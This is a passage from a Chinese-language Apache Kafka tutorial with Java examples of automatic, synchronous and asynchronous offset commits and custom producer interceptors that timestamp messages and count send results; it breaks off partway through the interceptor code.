</p><p>自动提交offset的相关参数：</p><p>enable.auto.commit：是否开启自动提交offset功能</p><p>auto.commit.interval.ms：自动提交offset的时间间隔</p><p>2）消费者自动提交offset</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecords<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>KafkaConsumer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomConsumer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"group.id"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"enable.auto.commit"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"auto.commit.interval.ms"</span><span class="token punctuation">,</span> <span class="token string">"1000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KafkaConsumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s%n"</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-重置Offset"><a href="#2-2-重置Offset" class="headerlink" title="2.2 重置Offset"></a>2.2 重置Offset</h3><p>auto.offset.rest = earliest | latest | none |</p><h3 id="2-3-手动提交offset"><a href="#2-3-手动提交offset" class="headerlink" title="2.3 手动提交offset"></a>2.3 手动提交offset</h3><p>虽然自动提交offset十分简介便利，但由于其是基于时间提交的，开发人员难以把握offset提交的时机。因此Kafka还提供了手动提交offset的API。</p><p>手动提交offset的方法有两种：分别是commitSync（同步提交）和commitAsync（异步提交）。两者的相同点是，都会将本次poll的一批数据最高的偏移量提交；不同点是，commitSync阻塞当前线程，一直到提交成功，并且会自动失败重试（由不可控因素导致，也会出现提交失败）；而commitAsync则没有失败重试机制，故有可能提交失败。</p><p>1）同步提交offset</p><p>由于同步提交offset有失败重试机制，故更加可靠，以下为同步提交offset的示例。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>consumer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecords<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>KafkaConsumer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomComsumer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Kafka集群</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//消费者组，只要group.id相同，就属于同一个消费者组</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"group.id"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"enable.auto.commit"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//关闭自动提交offset</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KafkaConsumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者订阅主题</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者拉取数据</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">for</span> <span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s%n"</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//同步提交，当前线程会阻塞直到offset提交成功</span>            consumer<span class="token punctuation">.</span><span class="token function">commitSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）异步提交offset</p><p>虽然同步提交offset更可靠一些，但是由于其会阻塞当前线程，直到提交成功。因此吞吐量会收到很大的影响。因此更多的情况下，会选用异步提交offset的方式。</p><p>以下为异步提交offset的示例：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>consumer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>common<span class="token punctuation">.</span>TopicPartition<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomConsumer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Kafka集群</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//消费者组，只要group.id相同，就属于同一个消费者组</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"group.id"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//关闭自动提交offset</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"enable.auto.commit"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KafkaConsumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者订阅主题</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者拉取数据</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s%n"</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//异步提交</span>            consumer<span class="token punctuation">.</span><span class="token function">commitAsync</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OffsetCommitCallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onComplete</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>TopicPartition<span class="token punctuation">,</span> OffsetAndMetadata<span class="token operator">></span> offsets<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        System<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Commit failed for"</span> <span class="token operator">+</span> offsets<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3） 数据漏消费和重复消费分析</p><p>无论是同步提交还是异步提交offset，都有可能会造成数据的漏消费或者重复消费。先提交offset后消费，有可能造成数据的漏消费；而先消费后提交offset，有可能会造成数据的重复消费。</p><h2 id="3-自定义Interceptor"><a href="#3-自定义Interceptor" class="headerlink" title="3 自定义Interceptor"></a>3 自定义Interceptor</h2><h3 id="3-1-拦截器原理"><a href="#3-1-拦截器原理" class="headerlink" title="3.1 拦截器原理"></a>3.1 拦截器原理</h3><p>Producer拦截器(interceptor)是在Kafka 0.10版本被引入的，主要用于实现clients端的定制化控制逻辑。</p><p>对于producer而言，interceptor使得用户在消息发送前以及producer回调逻辑前有机会对消息做一些定制化需求，比如修改消息等。同时，producer允许用户指定多个interceptor按序作用于同一条消息从而形成一个拦截链(interceptor chain)。Intercetpor的实现接口是org.apache.kafka.clients.producer.ProducerInterceptor，其定义的方法包括：</p><p>（1）configure(configs)</p><p>获取配置信息和初始化数据时调用。</p><p>（2）onSend(ProducerRecord)：</p><p>该方法封装进KafkaProducer.send方法中，即它运行在用户主线程中。Producer确保在消息被序列化以及计算分区前调用该方法。用户可以在该方法中对消息做任何操作，但最好保证不要修改消息所属的topic和分区，否则会影响目标分区的计算。</p><p>（3）onAcknowledgement(RecordMetadata, Exception)：</p><p>该方法会在消息从RecordAccumulator成功发送到Kafka Broker之后，或者在发送过程中失败时调用。并且通常都是在producer回调逻辑触发之前。onAcknowledgement运行在producer的IO线程中，因此不要在该方法中放入很重的逻辑，否则会拖慢producer的消息发送效率。</p><p>（4）close：</p><p>关闭interceptor，主要用于执行一些资源清理工作</p><p>如前所述，interceptor可能被运行在多个线程中，因此在具体实现时用户需要自行确保线程安全。另外倘若指定了多个interceptor，则producer将按照指定顺序调用它们，并仅仅是捕获每个interceptor可能抛出的异常记录到错误日志中而非在向上传递。这在使用过程中要特别留意。</p><h3 id="3-2-拦截器案例"><a href="#3-2-拦截器案例" class="headerlink" title="3.2 拦截器案例"></a>3.2 拦截器案例</h3><p>1）需求：</p><p>实现一个简单的双interceptor组成的拦截链。第一个interceptor会在消息发送前将时间戳信息加到消息value的最前部；第二个interceptor会在消息发送后更新成功发送消息数或失败发送消息数。</p><p>2）案例实操</p><p>（1）增加时间戳拦截器</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>RecordMetadata<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TimeInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">ProducerInterceptor</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> configs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">onSend</span><span class="token punctuation">(</span>ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建一个新的record，把时间戳写入消息体的最前部</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token punctuation">(</span>record<span class="token punctuation">.</span><span class="token function">topic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">partition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onAcknowledgement</span><span class="token punctuation">(</span>RecordMetadata metadata<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）统计发送消息成功和发送失败消息数，并在producer关闭时打印这两个计数器</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>RecordMetadata<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CounterInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">ProducerInterceptor</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> errorCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> successCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> configs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">onSend</span><span class="token punctuation">(</span>ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> record<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onAcknowledgement</span><span class="token punctuation">(</span>RecordMetadata metadata<span class="token 